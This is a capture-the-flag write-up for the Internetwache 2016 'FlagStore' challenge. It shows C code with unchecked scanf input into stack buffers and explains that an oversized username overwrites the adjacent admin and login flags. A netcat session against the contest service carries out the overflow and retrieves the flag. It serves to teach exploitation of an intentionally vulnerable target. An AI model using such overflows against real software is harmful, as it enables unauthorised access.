# Internetwache 2016 - Exploit - FlagStore - 70 pts

> Description: Here's the ultimate flag store. Store and retrieve your flags whenever you want.
>
> Attachment: [exp70.zip](exp70.zip)
>
> Service: 188.166.133.53:12157 

# Write-up

The flag store service let's us register/login and get a flag. 

Let's have a look at the code behind:

```c
int main() {
	char username[500];
	int is_admin = 0;
	char password[500];
	int logged_in = 0;
	char flag[250];

	char user[500];
	char pw[500];
	setbuf(stdout, NULL);
	printf("Welcome to the FlagStore!\n");
```

Register function:

```c
case 1:
	printf("Enter an username:");
	scanf("%s", username);
	printf("Enter a password:");
	scanf("%s", password);

	[SNIP]

	register_user(username, password);
	printf("User %s successfully registered. You can login now!\n", username);

	break;

void register_user(char *username, char *password) {
	//XXX: Implement database connection
	return;
}
```

Uh oh, no length check for username and password input...

So what prerequisites are needed to get the flag?

```c
case 3:
	if(logged_in == 0) {
		printf("Please login first!\n");
		break;
	}

	if(is_admin != 0) {
		strcpy(flag, FLAG);
	}

	printf("Your flag: %s\n", flag);

	break;
```

logged_in and is_admin have to be "something different" than zero. This makes it even easier, since we don't have to overflow the variables exactly. 
We just have to make sure logged_in and is_admin get overwriten with some value > 0.

This can simply be achieved by registering a user with a username bigger than 500 chars. This will result in overwriting logged_in and is_admin (to some random value, but this is good enough at long as it is != 0), so we can directly call getFlag afterwards.

```shell
$ nc 188.166.133.53 12157
Welcome to the FlagStore!
Choose an action:
> regiser: 1
> login: 2
> get_flag: 3
> store_flag: 4
1
Enter an username:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9
Enter a password:abcdefg
User Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9 successfully registered. You can login now!
Choose an action:
> regiser: 1
> login: 2
> get_flag: 3
> store_flag: 4
3
Your flag: IW{Y_U_NO_HAZ_FLAG}
```



